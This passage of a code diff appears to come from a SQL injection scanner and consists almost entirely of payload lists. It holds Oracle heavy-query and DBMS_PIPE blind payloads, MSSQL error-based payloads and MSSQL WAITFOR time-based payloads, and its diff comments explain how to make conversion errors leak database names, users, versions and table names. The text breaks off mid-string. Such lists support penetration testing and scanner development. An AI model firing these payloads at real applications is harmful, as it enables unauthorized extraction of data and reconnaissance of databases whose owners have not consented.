ROWNUM<10000) ELSE 0 END>0-- -', ' OR CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<10000) ELSE 0 END>0-- -', "' AND CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -", "' AND CASE WHEN 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -", "' OR CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -", ' AND CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -', ' AND CASE WHEN 1=1 AND 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -', ' OR CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -', "' AND CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -", "' AND CASE WHEN 2<1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -", "' OR CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -", ' AND CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -', ' AND CASE WHEN USER IS NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -', ' OR CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -', "' AND CASE WHEN LENGTH(USER)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -", "' AND CASE WHEN LENGTH(USER)<0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -", "' OR CASE WHEN LENGTH(USER)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -", ' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -', ' AND CASE WHEN (SELECT COUNT(*) FROM all_tables)<0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -', ' OR CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<20000) ELSE 0 END>0-- -', "' AND CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END>0-- -", "' AND CASE WHEN 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END>0-- -", "' OR CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END>0-- -", ' AND CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END>0-- -', ' AND CASE WHEN 1=1 AND 1=2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END>0-- -', ' OR CASE WHEN 1<>2 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END>0-- -', "' AND CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END>0-- -", "' AND CASE WHEN 2<1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END>0-- -", "' OR CASE WHEN 2>1 THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END>0-- -", ' AND CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END>0-- -', ' AND CASE WHEN USER IS NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END>0-- -', ' OR CASE WHEN USER IS NOT NULL THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<50000) ELSE 0 END>0-- -', "' AND DECODE(1,1,DBMS_PIPE.RECEIVE_MESSAGE('sqrdc1',1),0)>=0-- -", "' AND DECODE(1,2,DBMS_PIPE.RECEIVE_MESSAGE('sqrdc1',1),0)>=0-- -", " AND DECODE(1,1,DBMS_PIPE.RECEIVE_MESSAGE('sqrdc1',1),0)>=0-- -", "' OR DECODE(1,1,DBMS_PIPE.RECEIVE_MESSAGE('sqrdc1',1),0)>=0-- -", "' AND DECODE(1,1,DBMS_PIPE.RECEIVE_MESSAGE('sqrdc2',2),0)>=0-- -", "' AND DECODE(1,2,DBMS_PIPE.RECEIVE_MESSAGE('sqrdc2',2),0)>=0-- -", " AND DECODE(1,1,DBMS_PIPE.RECEIVE_MESSAGE('sqrdc2',2),0)>=0-- -", "' OR DECODE(1,1,DBMS_PIPE.RECEIVE_MESSAGE('sqrdc2',2),0)>=0-- -", "' AND DECODE(1,1,DBMS_PIPE.RECEIVE_MESSAGE('sqrdc3',3),0)>=0-- -", "' AND DECODE(1,2,DBMS_PIPE.RECEIVE_MESSAGE('sqrdc3',3),0)>=0-- -", " AND DECODE(1,1,DBMS_PIPE.RECEIVE_MESSAGE('sqrdc3',3),0)>=0-- -", "' OR DECODE(1,1,DBMS_PIPE.RECEIVE_MESSAGE('sqrdc3',3),0)>=0-- -", "' AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<1000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb1000d1',1) ELSE 0 END>=0-- -", " AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<1000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb1000d1',1) ELSE 0 END>=0-- -", "' AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<1000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb1000d2',2) ELSE 0 END>=0-- -", " AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<1000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb1000d2',2) ELSE 0 END>=0-- -", "' AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<1000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb1000d3',3) ELSE 0 END>=0-- -", " AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<1000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb1000d3',3) ELSE 0 END>=0-- -", "' AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<5000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb5000d1',1) ELSE 0 END>=0-- -", " AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<5000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb5000d1',1) ELSE 0 END>=0-- -", "' AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<5000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb5000d2',2) ELSE 0 END>=0-- -", " AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<5000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb5000d2',2) ELSE 0 END>=0-- -", "' AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<5000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb5000d3',3) ELSE 0 END>=0-- -", " AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<5000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb5000d3',3) ELSE 0 END>=0-- -", "' AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<10000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb10000d1',1) ELSE 0 END>=0-- -", " AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<10000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb10000d1',1) ELSE 0 END>=0-- -", "' AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<10000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb10000d2',2) ELSE 0 END>=0-- -", " AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<10000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb10000d2',2) ELSE 0 END>=0-- -", "' AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<10000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb10000d3',3) ELSE 0 END>=0-- -", " AND CASE WHEN (SELECT COUNT(*) FROM all_objects WHERE ROWNUM<10000)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('sqrhb10000d3',3) ELSE 0 END>=0-- -"]
 
@@ -169180,7 +169302,7 @@ MSSQL_ERROR_PAYLOADS = [
     "1' UNION SELECT CAST(COLUMN_NAME AS BIGINT) FROM INFORMATION_SCHEMA.COLUMNS--",
     "1' AND 1=(SELECT TOP 1 CONVERT(INT,TABLE_CATALOG) FROM INFORMATION_SCHEMA.TABLES)--",
     "1' WHERE EXISTS(SELECT CAST(ROUTINE_NAME AS INT) FROM INFORMATION_SCHEMA.ROUTINES)--",
-    "1' OR (SELECT TOP 1 CONVERT(FLOAT,CONSTRAINT_NAME) FROM INFORMATION_SCHEMA.CONSTRAINT_COLUMN_USAGE)--",
+    "1' OR (SELECT TOP 1 CONVERT(INT,CONSTRAINT_NAME) FROM INFORMATION_SCHEMA.CONSTRAINT_COLUMN_USAGE)--",
     "1' UNION ALL SELECT NULL,CAST(PARAMETER_MODE AS INT) FROM INFORMATION_SCHEMA.PARAMETERS--",
     "1' AND (SELECT COUNT(CAST(DOMAIN_NAME AS INT)) FROM INFORMATION_SCHEMA.DOMAINS)>0--",
     "1' WHERE 1=TRY_CONVERT(INT,(SELECT TOP 1 VIEW_NAME FROM INFORMATION_SCHEMA.VIEWS))--",
@@ -169363,11 +169485,14 @@ MSSQL_ERROR_PAYLOADS = [
     "1' AND 1=CONVERT(TINYINT,DB_NAME())--",
     "1' AND 1=CONVERT(NUMERIC,DB_NAME())--",
     "1' AND 1=CONVERT(DECIMAL,DB_NAME())--",
-    "1' AND 1=CONVERT(FLOAT,DB_NAME())--",
-    "1' AND 1=CONVERT(REAL,DB_NAME())--",
-    "1' AND 1=CONVERT(MONEY,DB_NAME())--",
-    "1' AND 1=CONVERT(DATETIME,DB_NAME())--",
-    "1' AND 1=CONVERT(DATE,DB_NAME())--",
+    # BUG-MSSQL-CONV FIX: FLOAT/REAL/MONEY/DATETIME/DATE conversion errors don't include
+    # the actual value in the SQL Server error message — only INT/BIGINT do.
+    # Replaced with INT conversions that DO expose the value in the OLE error.
+    "1' AND 1=CONVERT(INT,'~'+DB_NAME()+'~')--",
+    "1' AND 1=CONVERT(INT,'~'+SYSTEM_USER+'~')--",
+    "1' AND 1=CONVERT(INT,'~'+HOST_NAME()+'~')--",
+    "1' AND 1=CONVERT(INT,'~'+APP_NAME()+'~')--",
+    "1' AND 1=CONVERT(INT,'~'+@@SERVERNAME+'~')--",
     "1' AND 1=CONVERT(BIGINT,@@VERSION)--",
     "1' AND 1=CONVERT(BIGINT,SYSTEM_USER)--",
     "1' AND 1=CONVERT(BIGINT,HOST_NAME())--",
@@ -169393,16 +169518,19 @@ MSSQL_ERROR_PAYLOADS = [
     "1' WHERE CONVERT(INT,HOST_NAME())>0--",
     "1' WHERE CONVERT(INT,APP_NAME())>0--",
     "1' WHERE CONVERT(INT,@@SERVERNAME)>0--",
-    "1' AND TRY_CONVERT(INT,DB_NAME()) IS NOT NULL--",
-    "1' AND TRY_CAST(DB_NAME() AS INT) IS NOT NULL--",
-    "1' AND TRY_CONVERT(INT,SYSTEM_USER) IS NOT NULL--",
-    "1' AND TRY_CAST(SYSTEM_USER AS INT) IS NOT NULL--",
-    "1' AND TRY_CONVERT(INT,@@VERSION) IS NOT NULL--",
-    "1' AND TRY_CAST(@@VERSION AS INT) IS NOT NULL--",
-    "1' AND TRY_CONVERT(INT,HOST_NAME()) IS NOT NULL--",
-    "1' AND TRY_CAST(HOST_NAME() AS INT) IS NOT NULL--",
-    "1' AND TRY_CONVERT(INT,(SELECT TOP 1 name FROM sys.databases)) IS NOT NULL--",
-    "1' AND TRY_CAST((SELECT TOP 1 name FROM sys.tables) AS INT) IS NOT NULL--",
+    # BUG-MSSQL-TRY FIX: TRY_CAST/TRY_CONVERT suppress errors and return NULL —
+    # they produce no error message, making them useless in MSSQL_ERROR_PAYLOADS.
+    # Replaced with regular CAST/CONVERT that DO raise conversion errors.
+    "1' AND CAST('~'+DB_NAME()+'~' AS INT)>0--",
+    "1' AND CONVERT(INT,'~'+DB_NAME()+'~')>0--",
+    "1' AND CAST('~'+SYSTEM_USER+'~' AS INT)>0--",
+    "1' AND CONVERT(INT,'~'+SYSTEM_USER+'~')>0--",
+    "1' AND CAST('~'+@@VERSION+'~' AS INT)>0--",
+    "1' AND CONVERT(INT,'~'+@@VERSION+'~')>0--",
+    "1' AND CAST('~'+HOST_NAME()+'~' AS INT)>0--",
+    "1' AND CONVERT(INT,'~'+HOST_NAME()+'~')>0--",
+    "1' AND CAST('~'+(SELECT TOP 1 name FROM sys.databases)+'~' AS INT)>0--",
+    "1' AND CAST('~'+(SELECT TOP 1 name FROM sys.tables)+'~' AS INT)>0--",
     "1' AND 1=CONVERT(INT,'~'+DB_NAME()+'~')--",
     "1' AND 1=CONVERT(INT,'~'+SYSTEM_USER+'~')--",
     "1' AND 1=CONVERT(INT,'~'+@@VERSION+'~')--",
@@ -169476,54 +169604,53 @@ MSSQL_ERROR_PAYLOADS = [
 
 MSSQL_TIMEBASED_PAYLOADS = [" AND CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE WAITFOR DELAY '00:00:0' END", " AND (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE WAITFOR DELAY '00:00:0' END)", " OR CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE WAITFOR DELAY '00:00:0' END", " OR (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE WAITFOR DELAY '00:00:0' END)", " AND NOT CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE WAITFOR DELAY '00:00:0' END", " AND NOT (CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:1' ELSE WAITFOR DELAY '00:00:0' END)", " AND CASE WHEN 1<>2 THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END", " AND (CASE WHEN 1<>2 THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END)", " OR CASE WHEN 1<>2 THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END", " OR (CASE WHEN 1<>2 THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END)", " AND NOT CASE WHEN 1<>2 THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END", " AND NOT (CASE WHEN 1<>2 THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END)", " AND CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN LEN(USER_NAME())>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN (SELECT COUNT(*) FROM sys.tables)>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN (SELECT COUNT(*) FROM sys.tables)>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN (SELECT COUNT(*) FROM sys.tables)>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN (SELECT COUNT(*) FROM sys.tables)>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN (SELECT COUNT(*) FROM sys.tables)>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN (SELECT COUNT(*) FROM sys.tables)>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN DB_NAME() IS NOT NULL THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END", " AND (CASE WHEN DB_NAME() IS NOT NULL THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END)", " OR CASE WHEN DB_NAME() IS NOT NULL THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END", " OR (CASE WHEN DB_NAME() IS NOT NULL THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END)", " AND NOT CASE WHEN DB_NAME() IS NOT NULL THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END", " AND NOT (CASE WHEN DB_NAME() IS NOT NULL THEN WAITFOR DELAY '00:00:0.5' ELSE NULL END)", " AND CASE WHEN SUBSTRING(USER_NAME(),1,1)='d' THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN SUBSTRING(USER_NAME(),1,1)='d' THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN SUBSTRING(USER_NAME(),1,1)='d' THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN SUBSTRING(USER_NAME(),1,1)='d' THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN SUBSTRING(USER_NAME(),1,1)='d' THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN SUBSTRING(USER_NAME(),1,1)='d' THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN (SELECT COUNT(*) FROM sys.tables WHERE name LIKE '%')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN (SELECT COUNT(*) FROM sys.tables WHERE name LIKE '%')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN (SELECT COUNT(*) FROM sys.tables WHERE name LIKE '%')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN (SELECT COUNT(*) FROM sys.tables WHERE name LIKE '%')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN (SELECT COUNT(*) FROM sys.tables WHERE name LIKE '%')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN (SELECT COUNT(*) FROM sys.tables WHERE name LIKE '%')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES) THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES) THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES) THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES) THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES) THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.TABLES) THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN CHARINDEX(USER_NAME(),'dbo')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN CHARINDEX(USER_NAME(),'dbo')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN CHARINDEX(USER_NAME(),'dbo')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN CHARINDEX(USER_NAME(),'dbo')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN CHARINDEX(USER_NAME(),'dbo')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN CHARINDEX(USER_NAME(),'dbo')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN SUBSTRING(USER_NAME(),1,1)>'A' THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN SUBSTRING(USER_NAME(),1,1)>'A' THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN SUBSTRING(USER_NAME(),1,1)>'A' THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN SUBSTRING(USER_NAME(),1,1)>'A' THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN SUBSTRING(USER_NAME(),1,1)>'A' THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN SUBSTRING(USER_NAME(),1,1)>'A' THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN LEN(UPPER(USER_NAME()))>3 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN LEN(UPPER(USER_NAME()))>3 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN LEN(UPPER(USER_NAME()))>3 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN LEN(UPPER(USER_NAME()))>3 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN LEN(UPPER(USER_NAME()))>3 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN LEN(UPPER(USER_NAME()))>3 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN POWER(2,2)=4 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN POWER(2,2)=4 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN POWER(2,2)=4 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN POWER(2,2)=4 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN POWER(2,2)=4 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN POWER(2,2)=4 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN ROUND(3.14159,2)>3 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN ROUND(3.14159,2)>3 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN ROUND(3.14159,2)>3 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN ROUND(3.14159,2)>3 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN ROUND(3.14159,2)>3 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN ROUND(3.14159,2)>3 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN (SELECT SUM(1) FROM sys.columns)>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN (SELECT SUM(1) FROM sys.columns)>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN (SELECT SUM(1) FROM sys.columns)>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN (SELECT SUM(1) FROM sys.columns)>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN (SELECT SUM(1) FROM sys.columns)>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN (SELECT SUM(1) FROM sys.columns)>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME LIKE '%')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME LIKE '%')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME LIKE '%')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME LIKE '%')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME LIKE '%')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME LIKE '%')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE')>0 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN HAS_DBACCESS(DB_NAME())=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN HAS_DBACCESS(DB_NAME())=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN HAS_DBACCESS(DB_NAME())=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN HAS_DBACCESS(DB_NAME())=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN HAS_DBACCESS(DB_NAME())=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN HAS_DBACCESS(DB_NAME())=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND (CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " OR CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " OR (CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND NOT CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END", " AND NOT (CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN WAITFOR DELAY '00:00:1' ELSE NULL END)", " AND CASE WHEN SUBSTRING((SELECT USER_NAME()),1,1)='d' THEN 